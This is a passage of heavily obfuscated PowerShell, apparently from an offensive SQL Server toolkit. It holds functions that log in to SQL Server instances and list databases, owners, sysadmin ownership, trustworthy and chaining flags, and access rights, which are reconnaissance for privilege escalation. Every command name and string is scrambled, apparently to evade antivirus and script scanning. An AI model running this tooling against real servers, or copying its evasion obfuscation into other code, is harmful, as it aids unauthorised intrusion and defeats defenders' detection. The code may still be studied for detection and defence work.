        ${TBlrESu`l`Ts} = &("{1}{2}{0}" -f'Object','N','ew-') -TypeName ("{0}{3}{2}{4}{5}{1}"-f 'Sy','able','m.Da','ste','ta.Da','taT')
        ${tbLDA`TaBas`Es} = &("{1}{2}{0}"-f'ct','New','-Obje') -TypeName ("{0}{1}{4}{2}{3}"-f'S','y','e','m.Data.DataTable','st')
        ${N`ULL} = ${TbldA`T`A`BASeS}."coLu`mnS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{3}{2}{1}"-f'Comput','me','Na','er'))
        ${N`UlL} = ${Tbl`dAta`BaseS}."C`oL`UMNS".("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}" -f'e','Ins','tanc'))
        ${nu`LL} = ${T`BLd`A`T`ABAseS}."co`Lum`Ns".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{3}{2}"-f'Data','ba','Id','se'))
        ${NU`lL} = ${tbL`Da`Tab`ASES}."C`o`luMNs".("{1}{0}" -f 'd','Ad').Invoke(("{0}{3}{2}{1}"-f 'Dat','ame','seN','aba'))
        ${n`ULl} = ${tBLdA`T`AB`AS`ES}."cOlu`MNS".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}" -f 'D','wner','atabaseO'))
        ${N`Ull} = ${TbLDaT`A`Ba`SeS}."c`OLumnS".("{0}{1}" -f'A','dd').Invoke(("{2}{1}{3}{0}" -f'min','sSys','OwnerI','ad'))
        ${N`Ull} = ${t`BLdATA`BAses}."co`lumNS".("{1}{0}"-f'd','Ad').Invoke(("{5}{3}{2}{0}{1}{4}"-f 'ustwort','h','tr','_','y_on','is'))
        ${nU`ll} = ${tBLdaTaB`A`ses}."CoL`Umns".("{1}{0}"-f'd','Ad').Invoke(("{2}{0}{1}{4}{3}{5}" -f'_db','_ch','is','ng','aini','_on'))
        ${n`UlL} = ${T`BlDAtaB`ASes}."Colu`mnS".("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{3}{1}" -f 'is_bro','_enabled','k','er'))
        ${n`ULl} = ${TB`lDaTaBa`S`ES}."colu`M`Ns".("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}" -f 'is_en','d','crypte'))
        ${Nu`LL} = ${tb`Ld`AT`AB`AsES}."col`Um`Ns".("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{2}{1}" -f'is_r','nly','o','ead_'))
        ${nu`Ll} = ${t`BldaT`Ab`AsES}."CoLu`Mns".("{0}{1}"-f'Ad','d').Invoke(("{2}{3}{1}{0}"-f'te','a','c','reate_d'))
        ${N`ULL} = ${t`BL`D`AtAbas`Es}."c`OLuMNS".("{1}{0}" -f 'dd','A').Invoke(("{0}{4}{1}{2}{3}" -f 'rec','y_m','od','el_desc','over'))
        ${n`ULL} = ${TbL`da`TaB`As`es}."c`Olumns".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f 'Fi','me','leNa'))
        ${n`Ull} = ${TBlD`ATA`BaSES}."C`O`LUmNs".("{0}{1}" -f'A','dd').Invoke(("{0}{2}{1}"-f 'D','zeMb','bSi'))
        ${Nu`LL} = ${tblDa`TAbas`ES}."ColUm`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{1}"-f'bac','cess','has_d'))

        
        if(${DAt`AB`ASEnAmE})
        {
            ${Da`TA`B`A`SeFIlTer} = (' '+'a'+'nd '+'a.name'+' '+'li'+'ke '+"'$DatabaseName'")
        }
        else
        {
            ${DAtA`B`ASeF`ILter} = ''
        }

        
        if(${nOD`E`FaULTS})
        {
            ${noD`EfaUlTs`Fi`l`TEr} = ((("{6}{5}{1}{7}{11}{0}{4}{2}{9}{12}{3}{10}{8}" -f'kamas','d a.name ','Oka,OkatempdbOka,Okam','lOk','ter','n',' a','not in (',')','s','a','O','dbOka,Okamode'))-cREPLaCe  'Oka',[char]39)
        }
        else
        {
            ${n`O`defa`ULtSFI`Lter} = ''
        }

        
        if(${HA`sa`CcesS})
        {
            ${HaSAc`cE`sS`FiL`T`eR} = (("{3}{4}{2}{1}{0}"-f'ame)=1','CESS(a.n','_DBAC',' a','nd HAS'))
        }
        else
        {
            ${HASAc`cE`S`S`FiLter} = ''
        }

        
        if(${SYsA`Dm`i`N`ONLY})
        {
            ${sYS`ADMi`NoN`lyf`il`TeR} = ((("{18}{2}{8}{11}{12}{16}{7}{13}{6}{5}{10}{1}{17}{14}{0}{15}{4}{9}{3}"-f'wne','A','nd',')=1','i','SUSER_S','L,','ysadm',' ','d)','N','IS_SRVROLEMEMBE','R','in0S','a.o','r_s','(0SLs','ME(',' a'))-cREplacE '0SL',[CHAR]39)
        }
        else
        {
            ${S`YSa`DM`iNoN`LY`FILter} = ''
        }
    }

    Process
    {
        
        ${cOmP`UT`Erna`ME} = &("{1}{7}{4}{6}{0}{3}{2}{5}" -f'Na','Ge','o','meFr','put','mInstance','er','t-Com') -Instance ${i`N`s`TaNce}

        
        if(-not ${iNST`An`cE})
        {
            ${I`N`sTa`Nce} = ${en`V:CO`M`PUteR`NAMe}
        }

        
        ${Tes`T`ConnEcTI`On} = &("{2}{0}{5}{4}{1}{3}" -f 'S','ectio','Get-','nTest','onn','QLC') -Instance ${i`N`StaN`cE} -Username ${Us`ErNa`Me} -Password ${pASsW`ord} -Credential ${CRE`De`NtiAl} -SuppressVerbose | &("{1}{0}{2}{3}" -f 'here-','W','Obj','ect') -FilterScript {
            ${_}."StA`T`Us" -eq ("{0}{2}{1}"-f'Accessib','e','l')
        }
        if(${tE`StCOn`N`eCtION})
        {
            if( -not ${SuPp`Re`s`SvERBoSe})
            {
                &("{3}{2}{1}{0}" -f'erbose','V','e-','Writ') -Message ("$Instance "+': '+'Connec'+'tio'+'n '+'Su'+'ccess.')
            }
        }
        else
        {
            if( -not ${s`UppRES`sv`erBOSe})
            {
                &("{1}{0}{3}{2}" -f 'Ve','Write-','e','rbos') -Message ("$Instance "+': '+'Co'+'nne'+'c'+'tion '+'F'+'ai'+'led.')
            }
            return
        }

        
        ${sQlV`E`RsIoNfUlL} = &("{1}{3}{2}{0}{4}" -f '-SQLS','G','t','e','erverInfo') -Instance ${ins`TAN`cE} -Username ${U`seRna`ME} -Password ${pasS`W`orD} -Credential ${CRE`dEn`TiaL} -SuppressVerbose | &("{4}{2}{3}{0}{1}"-f'ec','t','-','Obj','Select') -Property ("{3}{1}{0}{2}{4}{5}"-f'Se','QL','rverVersio','S','nNumb','er') -ExpandProperty ("{3}{2}{1}{0}{4}"-f 'rsio','rVe','Serve','SQL','nNumber')
        if(${S`Q`LvErSi`onf`ULL})
        {
            ${SQ`LvErS`IonS`HORt} = ${sq`Lv`Er`si`onfuLl}.("{1}{0}"-f 'plit','S').Invoke('.')[0]
        }

        
        ${QuErYst`A`RT} = (' '+' '+'S'+'ELECT'+' '+' '+"'$ComputerName' "+'as'+' '+'[Co'+'mputerN'+'am'+'e'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[I'+'nstanc'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.data'+'base_'+'id'+' '+'a'+'s '+'[D'+'atab'+'aseI'+'d'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.name'+' '+'a'+'s '+'[D'+'a'+'ta'+'b'+'aseName],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SU'+'SER_'+'SNAME(a'+'.owne'+'r_sid)'+' '+'as'+' '+'['+'DatabaseOw'+'ne'+'r],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('IS_SRV'+'ROLEMEMBE'+'R(yI1sysadmi'+'nyI1,SU'+'SE'+'R_SN'+'A'+'ME(a.ow'+'n'+'e'+'r'+'_si'+'d)) ')."R`eP`laCE"('yI1',[STrInG][CHAR]39)+'as'+' '+'[Own'+'erIsSysa'+'dm'+'i'+'n],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.is'+'_tr'+'ustwo'+'rthy_o'+'n,
 '+' '+' '+' '+' '+' '+' '+' '+'a.i'+'s_db_'+'chaining_on'+',')

        
        if([int]${sQL`V`ersIOn`s`HoRt} -ge 10)
        {
            ${qu`Eryve`RSpeC} = ("{16}{9}{13}{17}{11}{8}{1}{2}{15}{5}{3}{10}{0}{6}{14}{7}{4}{12}"-f '     ','_broker_enabled,
     ','      ',' a.is_encrypted,','nly',' ','      a.','o','is','  ','
 ','     a.',',',' ','is_read_','   ','
 ','       ')
        }

        
        ${Q`Uer`YEnD} = ("{40}{35}{42}{85}{11}{72}{8}{106}{21}{17}{14}{19}{93}{36}{52}{28}{78}{94}{13}{63}{65}{59}{10}{9}{23}{58}{64}{20}{114}{66}{68}{80}{53}{96}{18}{61}{31}{74}{90}{33}{89}{22}{16}{55}{50}{71}{88}{44}{116}{70}{0}{111}{82}{117}{95}{32}{112}{84}{27}{115}{24}{107}{67}{62}{7}{86}{57}{76}{46}{77}{101}{73}{109}{37}{4}{108}{41}{92}{5}{60}{54}{75}{39}{30}{97}{45}{6}{103}{110}{43}{98}{100}{56}{3}{113}{48}{12}{51}{99}{25}{79}{87}{69}{47}{2}{49}{15}{29}{83}{102}{105}{34}{38}{1}{104}{26}{81}{91}"-f '    ','s','N [sys].','  ','izeM',' ','.n',' n','e_date,
','      b','  ','ea','[s','c','  ','ysda','(SUM(size',' ',' ','      a.reco','a','  ','CAST','.fil','s ','[databa','id','e','el_d','t','S_DB','      (','m sys.','CT','N','    ','r','S',' a.databa','HA','
    ','],
','   ','c','S D','SS(a','e','NER JOI',' ','[s','/','ys]','y_mod','e],
 ','     ',') * 8. ','
         ','me like a','e','   ','   ','  ','e',',
','name ',' ','[','r','FileNa','      IN','MAL(8,2))
',' ','t','s','SE','  ','.nam',') ','e','ses]','m',' = b.dbid WHERE',' ','a','ast',' a.cr','a',' a
  ','1024 A',' ','LE',' 1=1',' ','ve','s','ro','  ','ACCE','ess','.',']','a','b','ame) as [has_dba','e_','ases] b O',' ','whe','b',' [Db','c','     ','m',' FROM','s ','r_file','ECI','  f')

        
        ${F`ILters} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$DatabaseFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$NoDefaultsFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$HasAccessFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysAdminOnlyFilter
 "+' '+' '+' '+' '+' '+' '+' '+'ORD'+'ER '+'B'+'Y '+'a.datab'+'ase_i'+'d')

        ${q`U`erY} = ("$QueryStart "+"$QueryVerSpec "+"$QueryEnd "+"$Filters")

        
        ${Tblre`su`lts} = &("{1}{0}{3}{2}"-f'et','G','ery','-SQLQu') -Instance ${iN`st`Ance} -Query ${qU`E`Ry} -Username ${usER`NaMe} -Password ${pA`ss`w`Ord} -Credential ${CR`edeNT`iaL} -SuppressVerbose

        
        ${T`BlR`ESuLTS} |
        &("{2}{0}{1}"-f 'j','ect','ForEach-Ob') -Process {
            
            if([int]${sQlv`ErSionS`H`orT} -ge 10)
            {
                ${IS`_B`ROkER`_En`ABlEd} = ${_}."is_bROKer_ENA`B`l`ed"
                ${i`S_e`N`crYpT`Ed} = ${_}."IS_e`Nc`RY`PTED"
                ${i`s_`Read_`oN`ly} = ${_}."I`S_REaD_`On`lY"
            }
            else
            {
                ${I`s_`BROkE`R_E`N`AbLeD} = 'NA'
                ${iS_En`C`R`ypTeD} = 'NA'
                ${iS_`R`ead`_onlY} = 'NA'
            }

            ${n`ULl} = ${tbLdAt`Ab`ASes}."r`ows".("{0}{1}" -f'Ad','d').Invoke(
                ${_}."C`oMp`UTErName",
                ${_}."i`NST`AncE",
                ${_}."dA`TAb`Ase`id",
                ${_}."dat`Aba`s`enAmE",
                ${_}."dA`TAbASE`OW`NEr",
                ${_}."owN`ERIs`SysAd`mIN",
                ${_}."is`_TrUsTwo`Rt`hY_`ON",
                ${_}."is_DB_cHa`INi`NG`_on",
                ${is_brO`k`e`R`_E`NAbled},
                ${iS_EncRY`pt`Ed},
                ${IS_`R`EaD_ONLy},
                ${_}."cRe`A`TE_DAtE",
                ${_}."rE`cO`VeRy_MO`d`E`L_dEsC",
                ${_}."FILE`NAMe",
                ${_}."db`Sizemb",
                ${_}."h`As_dbAC`CESS"
            )
        }

    }

    End
    {
        
        ${TBlDaT`Ab`AS`Es}
    }
}






Function  GET-s`Q`LD`AtAba`Set`HR`eADeD
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdAtory = ${FAl`se},
        heLPMesSaGE = {"{7}{12}{8}{2}{0}{10}{11}{5}{1}{6}{3}{4}{9}" -f'r do','account to au','r o','en','tica','n ','th','SQL ','erve','te with.','m','ai','S'})]
        [string]${u`S`ErnaMe},

        [Parameter(MandatOrY = ${F`AlSe},
        HElPMESsagE = {"{5}{9}{10}{0}{8}{7}{6}{2}{1}{3}{4}{11}" -f'r','password to authent','t ','ica','te with','S','oun','n acc',' or domai','Q','L Serve','.'})]
        [string]${Pa`S`swOrd},

        [Parameter(MANDATory = ${f`AL`Se},
        HELPmEsSagE = {"{4}{1}{3}{0}{2}"-f 'n',' cred','tials.','e','Windows'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`RedE`Nti`AL} =  $0459M2::"em`ptY",

        [Parameter(manDATOrY = ${fa`L`se},
                VAluEFROMPIpELInEbyPrOpErTyname = ${T`Rue},
        HelPMeSSagE = {"{7}{2}{10}{9}{5}{6}{3}{4}{8}{1}{0}" -f'.','o',' i','e','cti','e to ','conn','SQL Server','on t','stanc','n'})]
        [string]${I`Ns`TaNcE},

        [Parameter(MaNDAToRy = ${fA`l`sE},
                valUEfRoMpipELIne = ${TR`Ue},
                VaLUEfroMpIPeliNEBYPRoPeRtynAME = ${Tr`UE},
        heLPMESsagE = {"{0}{2}{1}"-f'Da','e.','tabase nam'})]
        [string]${DA`TaBaS`EN`AmE},

        [Parameter(MandAtoRY = ${F`AlsE},
        HelPMESsaGe = {"{9}{8}{1}{2}{4}{7}{0}{5}{3}{10}{6}"-f 't data','y s','elect','ase',' non def','b','.','aul','l','On','s'})]
        [switch]${no`D`e`FaULts},

        [Parameter(manDaTorY = ${fA`LSE},
        HELpMESsaGe = {"{6}{4}{0}{10}{5}{9}{7}{1}{2}{8}{3}" -f'lect da','t',' user has ac','o.','ly se',' ','On','curren','cess t','the ','tabases'})]
        [switch]${HAS`AccE`ss},

        [Parameter(mAndaToRY = ${fAL`Se},
        HelpMESsagE = {"{1}{5}{0}{6}{3}{4}{2}"-f'lect d','O','.',' sys','admin','nly se','atabases owned by a'})]
        [switch]${s`y`sa`DmiNonLY},

        [Parameter(maNdaTORy = ${f`AL`Se},
        helpMeSSagE = {"{3}{0}{1}{2}" -f 'rea','d','s.','Number of th'})]
        [int]${thR`Ea`dS} = 2,

        [Parameter(ManDatOry = ${f`AlSe},
        hElPMeSsAgE = {"{7}{1}{3}{5}{0}{4}{8}{10}{6}{2}{9}"-f 'r','s','ion is wrappe','e','rors.  U',' e','funct','Suppress verbo','sed w','d.','hen '})]
        [switch]${su`pprES`svErbo`SE}
    )

    Begin
    {
        
        ${tbLreSu`l`TS} = &("{2}{0}{1}"-f 'Ob','ject','New-') -TypeName ("{3}{1}{0}{2}{5}{4}"-f'm.Data','ste','.DataT','Sy','ble','a')
        ${tb`LdAt`Ab`AS`eS} = &("{0}{2}{1}" -f'Ne','t','w-Objec') -TypeName ("{3}{1}{4}{2}{0}"-f 'e','em.Data.DataT','bl','Syst','a')
        ${N`ULl} = ${T`B`LDATaBA`SEs}."COl`U`MNS".("{1}{0}" -f'dd','A').Invoke(("{2}{3}{0}{1}"-f 'mpute','rName','C','o'))
        ${nu`lL} = ${t`BL`DAtabAsES}."C`O`lumnS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{2}" -f 'Insta','n','ce'))
        ${NU`lL} = ${TBLD`AT`AB`AS`es}."co`l`UMNS".("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}" -f'D','eId','atabas'))
        ${N`ULl} = ${tb`ldAtABA`S`eS}."C`OLuM`NS".("{1}{0}"-f'd','Ad').Invoke(("{2}{3}{0}{1}" -f'bas','eName','Da','ta'))
        ${n`UlL} = ${Tbl`D`At`ABaS`Es}."c`oLuMNs".("{0}{1}"-f'Ad','d').Invoke(("{3}{1}{0}{2}" -f'Ow','ase','ner','Datab'))
        ${n`Ull} = ${tBLDa`TABA`sES}."COlU`mNS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{2}{3}" -f'nerIs','Ow','Sysad','min'))
        ${n`ULL} = ${TblDA`Ta`BAS`Es}."Co`lumns".("{1}{0}" -f'dd','A').Invoke(("{4}{0}{2}{1}{3}" -f'_trust','hy_o','wort','n','is'))
        ${N`ULL} = ${t`BLdaT`A`BAsES}."CO`lU`mns".("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{3}{4}{2}"-f 's_db','i','aining_on','_c','h'))
        ${nu`lL} = ${tbLd`A`TaBA`S`ES}."Co`l`UmNS".("{0}{1}" -f'Ad','d').Invoke(("{2}{4}{3}{0}{1}" -f 'le','d','is_br','nab','oker_e'))
        ${nU`Ll} = ${tb`LDAtA`BA`S`es}."Col`Umns".("{0}{1}" -f 'A','dd').Invoke(("{3}{2}{0}{1}" -f'ncryp','ted','_e','is'))
        ${Nu`ll} = ${tBLd`ATaB`A`seS}."c`oLU`mns".("{1}{0}" -f'd','Ad').Invoke(("{1}{3}{0}{2}"-f 'o','is_re','nly','ad_'))
        ${N`ULL} = ${TbL`D`ATa`BaSeS}."Co`L`UmNS".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}"-f'date','cre','ate_'))
        ${nu`Ll} = ${T`Bl`Da`TabAsES}."coL`U`mnS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{3}{4}{2}" -f 'rec','over','sc','y_model_','de'))
        ${Nu`Ll} = ${tb`Ld`At`AB`AsES}."coLum`NS".("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{1}"-f 'eNam','e','Fil'))
        ${nU`Ll} = ${TbLDatab`As`ES}."co`LUmNs".("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}" -f'Mb','e','DbSiz'))
        ${N`Ull} = ${TBLd`ATA`BaSEs}."colu`Mns".("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{3}{1}" -f 'c','s','has_dbac','es'))

        
        if(${d`AT`ABasENA`ME})
        {
            ${D`A`T`AB`ASEfIlTEr} = (' '+'and'+' '+'a.n'+'ame '+'lik'+'e '+"'$DatabaseName'")
        }
        else
        {
            ${DAtaBa`SeFi`LtEr} = ''
        }

        
        if(${NoDeFA`U`LTS})
        {
            ${nO`de`FaU`lTs`FilTEr} = ((("{0}{5}{1}{4}{2}{3}{7}{11}{12}{6}{8}{9}{14}{10}{13}"-f ' an','.name','ot in',' (N8qmasterN8',' n','d a','s','q,N8q','dbN','8q,N8qmode','8q','temp','dbN8q,N8qm',')','lN'))-ReplacE  'N8q',[CHAR]39)
        }
        else
        {
            ${n`O`d`e`FAULTSfiL`TeR} = ''
        }

        
        if(${Ha`sacce`sS})
        {
            ${HAS`AC`CessfIl`T`er} = ("{3}{0}{5}{2}{1}{4}" -f 'S','(a.','ESS',' and HA','name)=1','_DBACC')
        }
        else
        {
            ${HASaCC`Es`Sf`iLTER} = ''
        }

        
        if(${sySaD`MIN`o`NlY})
        {
            ${sYsa`dM`InoNlYFI`LTEr} = ((("{1}{10}{8}{9}{4}{6}{0}{2}{3}{5}{7}" -f'a.owne',' and IS_S','r_s','i','({','d))=','0}sysadmin{0},SUSER_SNAME(','1','LE','MEMBER','RVRO'))  -F  [char]39)
        }
        else
        {
            ${SY`s`ADmin`OnL`y`FIl`TEr} = ''
        }

        
        ${p`IpelIn`EiTeMs} = &("{2}{0}{1}" -f'c','t','New-Obje') -TypeName ("{0}{1}{3}{2}{4}" -f 'Syste','m.D','.Data','ata','Table')


        
        if(-not ${i`NsTaN`Ce})
        {
            ${In`StAN`cE} = ${EnV:CompUT`E`R`Name}
        }

        
        if(${I`N`sT`AnCe})
        {
            ${Provi`D`Ein`STAN`cE} = &("{0}{2}{1}" -f'N','w-Object','e') -TypeName ("{1}{2}{0}"-f 'ect','PS','Obj') -Property @{
                ("{0}{1}"-f'Instanc','e') = ${INS`TA`NcE}
            }
        }

        
        ${Pi`peLiN`EI`TemS} = ${Pipe`l`iN`eiTems} + ${prOv`Id`EIN`stanCE}
    }

    Process
    {
        
        ${pIP`e`L`inEi`TEMs} = ${pipE`li`Ne`itE`ms} + ${_}
    }

    End
    {
        
        ${MY`Scr`i`PtBlOck} = {
            
            ${in`S`TAn`Ce} = ${_}."i`NstaNCe"

            
            ${C`o`mPuterN`AME} = &("{0}{3}{4}{5}{2}{1}" -f'Get-Co','nce','a','mputerNam','eFromIns','t') -Instance ${InsT`A`Nce}

            
            ${t`ES`TcoNNEc`T`Ion} = &("{5}{6}{3}{4}{2}{1}{0}" -f 'est','ectionT','n','QLC','on','G','et-S') -Instance ${INsT`AnCe} -Username ${UsErN`AMe} -Password ${P`ASSW`orD} -Credential ${c`ReD`eNtiaL} -SuppressVerbose | &("{3}{1}{0}{2}" -f 'bj','-O','ect','Where') -FilterScript {
                ${_}."S`Ta`TUs" -eq ("{3}{0}{1}{2}"-f'ccessi','bl','e','A')
            }
            if(${TesTC`o`N`Nec`TIOn})
            {
                if( -not ${SuP`PreSs`V`erbOSE})
                {
                    &("{2}{3}{0}{1}"-f 'rbos','e','Write-','Ve') -Message ("$Instance "+': '+'Connec'+'t'+'io'+'n '+'Success'+'.')
                }
            }
            else
            {
                if( -not ${SuppRessVEr`B`OSE})
                {
                    &("{2}{0}{3}{1}"-f'te','Verbose','Wri','-') -Message ("$Instance "+': '+'Connectio'+'n'+' '+'Fa'+'iled'+'.')
                }
                return
            }

            
            ${sQLVeRS`iOn`FulL} = &("{0}{2}{3}{1}" -f 'Get-SQLS','Info','er','ver') -Instance ${inStA`N`Ce} -Username ${u`ser`NaME} -Password ${P`AsS`wORd} -Credential ${crEdENt`I`AL} -SuppressVerbose | &("{3}{2}{0}{1}"-f'ec','t','Obj','Select-') -Property ("{2}{3}{4}{0}{1}"-f'erV','ersionNumber','SQL','Se','rv') -ExpandProperty ("{0}{2}{5}{3}{6}{1}{4}"-f'S','mbe','QLSe','erVersi','r','rv','onNu')
            if(${sQlV`e`RSioNF`U`ll})
            {
                ${S`QlvEr`S`iONs`ho`Rt} = ${S`QL`VErs`IOnf`ULL}.("{0}{1}"-f 'Sp','lit').Invoke('.')[0]
            }

            
            ${qUE`Ry`sTArt} = (' '+' '+'SELEC'+'T '+' '+"'$ComputerName' "+'a'+'s '+'[Com'+'puterN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'['+'Inst'+'an'+'ce],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.'+'d'+'atabase'+'_id '+'a'+'s '+'[Databas'+'e'+'Id],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.'+'nam'+'e '+'a'+'s '+'['+'DatabaseName'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUSER_SN'+'A'+'ME(a.o'+'w'+'n'+'e'+'r_s'+'id) '+'as'+' '+'['+'Database'+'Owner'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('I'+'S_'+'SRVRO'+'L'+'EMEMBE'+'R(K'+'2'+'YsysadminK2Y,SUSE'+'R_SNAM'+'E(a.owner'+'_sid)) ')."REPl`AcE"('K2Y',[sTRiNg][Char]39)+'a'+'s '+'['+'OwnerI'+'s'+'Sysadmin]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.'+'is_tru'+'stworthy'+'_on,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.'+'is_db'+'_chai'+'ning'+'_on,')

            
            if([int]${sq`lVErSIo`N`S`hOrt} -ge 10)
            {
                ${Q`UERyvE`RsP`EC} = ("{1}{10}{24}{23}{0}{17}{3}{16}{12}{7}{14}{15}{22}{19}{18}{8}{2}{9}{21}{6}{20}{4}{5}{11}{13}" -f '     a.is_','
   ','_','ker_','     a','.is_read_o','   ','  ','s','encrypt','    ','nly','ed,
',',',' ','     ','enabl','bro','.i','          a','      ','ed,
  ','  ','  ','      ')
            }

            
            ${q`Ue`RYenD} = ((("{48}{82}{53}{73}{47}{38}{79}{4}{37}{88}{81}{25}{52}{1}{27}{11}{60}{76}{72}{78}{8}{87}{65}{44}{74}{85}{46}{0}{64}{62}{59}{36}{29}{39}{13}{83}{51}{5}{80}{2}{33}{43}{9}{20}{49}{21}{41}{58}{24}{61}{10}{90}{15}{28}{84}{30}{68}{70}{32}{69}{18}{3}{34}{42}{12}{7}{77}{14}{26}{66}{40}{63}{6}{23}{16}{50}{57}{22}{54}{31}{75}{19}{45}{71}{56}{89}{86}{17}{67}{55}{35}{91}" -f' ',' a.recovery_mode','M','A','_da','E','].[d','a','lena','8,2))
','a',' ','has_db','8. / ','     ',' a',' ','N','_DB','t','    ','       from','JOIN [s','atabases] a
     ','iles where name like','  ','   ','l_desc,
','s ','SUM(size','DbSizeM','].[sysd','       HA','AL','CCES','dbid WHERE 1','AST(','te','a',') * ','     FROM ',' sys','S(a.name) as [','(','N','a','     ','cre','
   ','     ','     ','S D','    ','   ','ys','a.database_id = b.','s',' INNER ','.master_f',' C','     ',' a.n','CT','[sys','   (SELE','[File','   ',' ','b],
       ','S','  ','base','   b.','      a.','ame],
     ','a','       ','ccess]
','fi','te','CI','         ','    ','1024 A','[','  ','O','me as ',',
','] b ','me)','=1')))

            
            ${fiLT`ERs} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$DatabaseFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$NoDefaultsFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$HasAccessFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysAdminOnlyFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ORDE'+'R '+'B'+'Y '+'a.da'+'taba'+'s'+'e_i'+'d')

            ${q`UE`RY} = ("$QueryStart "+"$QueryVerSpec "+"$QueryEnd "+"$Filters")

            
            ${tb`Lr`EsuL`TS} = &("{1}{2}{0}{3}"-f't-SQL','G','e','Query') -Instance ${Ins`T`AncE} -Query ${Q`Uery} -Username ${user`Na`ME} -Password ${Pa`SSW`ord} -Credential ${crEde`Nt`iAl} -SuppressVerbose

            
            ${tBlrEsU`l`Ts} |
            &("{0}{1}{2}{3}"-f'ForE','ach-','Obj','ect') -Process {
                
                if([int]${S`Q`lVers`IOnsho`RT} -ge 10)
                {
                    ${is_BrOKer`_`en`ABlED} = ${_}."I`S`_B`Roker_ENAbLed"
                    ${i`s_e`NcRYP`Ted} = ${_}."Is_`encR`yptEd"
                    ${Is_Re`A`D_OnlY} = ${_}."Is`_Rea`D_`onLy"
                }
                else
                {
                    ${Is_brOKER_e`N`ABL`ed} = 'NA'
                    ${iS`_`ENCRypT`ED} = 'NA'
                    ${is_`R`eAD_oNLy} = 'NA'
                }

                ${N`ULL} = ${TB`ldaTA`B`ASES}."R`Ows".("{0}{1}"-f 'Ad','d').Invoke(
                    ${_}."COM`pu`T`ERnAME",
                    ${_}."I`NS`TancE",
                    ${_}."d`ATabaS`eId",
                    ${_}."dat`ABAsEnA`mE",
                    ${_}."dAtABasEO`Wn`eR",
                    ${_}."oWN`ERi`ss`ySaDMIn",
                    ${_}."IS`_T`RuStwORt`h`y_oN",
                    ${_}."i`S_D`B_CHa`iNI`N`g_on",
                    ${is`_B`R`okEr_`eNABLeD},
                    ${IS_enCry`p`TEd},
                    ${i`s_rEA`D`_o`Nly},
                    ${_}."cReAtE_`D`Ate",
                    ${_}."rECOVeRY_m`OD`eL_`dE`SC",
                    ${_}."fIl`EN`AmE",
                    ${_}."Db`SIz`Emb",
                    ${_}."haS_D`BaCCe`SS"
                )
            }
        }

        
        ${pipeLIN`E`iT`e`MS} | &("{2}{0}{3}{1}" -f'aral','l','Invoke-P','le') -ScriptBlock ${m`ySC`RiP`TB`LoCk} -ImportSessionFunctions -ImportVariables -Throttle ${Thr`EaDs} -RunspaceTimeout 2 -Quiet -ErrorAction ("{1}{3}{2}{0}{4}"-f 'tlyC','Sil','n','e','ontinue')

        return ${TBL`dA`TABASES}
    }
}






Function  GeT`-sQl`TABle
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANDAtorY = ${FAL`SE},
                vALUefromPIPeliNeBypRoPeRtyNAmE = ${tr`UE},
        heLpmEssage = {"{11}{2}{7}{9}{5}{1}{10}{4}{8}{3}{0}{6}"-f 'ith','accou',' Serve','ticate w','t to authe','main ','.','r','n',' or do','n','SQL'})]
        [string]${Us`E`RnAME},

        [Parameter(MAndAtORy = ${f`AlsE},
                valueFRompipELiNebyPrOPeRTYname = ${Tr`UE},
